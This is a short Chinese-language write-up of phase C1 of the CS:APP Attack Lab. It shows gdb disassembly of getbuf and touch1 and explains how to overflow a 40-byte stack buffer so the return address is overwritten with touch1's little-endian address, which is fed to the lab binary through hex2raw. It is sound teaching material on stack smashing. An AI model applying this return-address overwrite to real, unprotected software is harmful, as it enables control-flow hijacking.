# Attack Lab
## C1 记录

**解决步骤**<br>
1. 阅读 [Writeup说明书](../attacklab-writeup.zh.md)，搞清楚 C1 的目标，已知没有 ASLR 和 Canary
2. 反汇编 `(gdb) disassemble getbuf` 和 `touch1`
3. 找到与 ***return地址*** 的相对距离
4. 找到 `touch1` 函数首行地址

5. 用 `./hex2raw` 和 ***管道符*** 向`ctarget`传入答案

<br>

***下面是代码和注释***
```x86asm
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   // 这里按常理字符是从 %rsp 开始写入，如果不安心可以看一眼 Gets 函数
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```
```x86asm
(gdb) disassemble touch1
Dump of assembler code for function touch1:
   // 这就是 touch1 的起始地址了
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   // 以下省略不重要
```
---
**有了以上信息，我们就知道以下几点**
1. 在 `call getbuf` 的时候，%rsp - 8，这块内存用来存放原本的返回后 %rip 地址
2. 在 `getbuf` 内部，%rsp 向下扩展了 40 个字节，用来存放输入
3. `touch1` 的起始地址是 `0x00000000004017c0`，按照小端法书写是：`c0 17 40 00 00 00 00 00`，需要用 `./hex2raw`
4. 其他的 40 个字节用 00 填充即可，其他的也行。
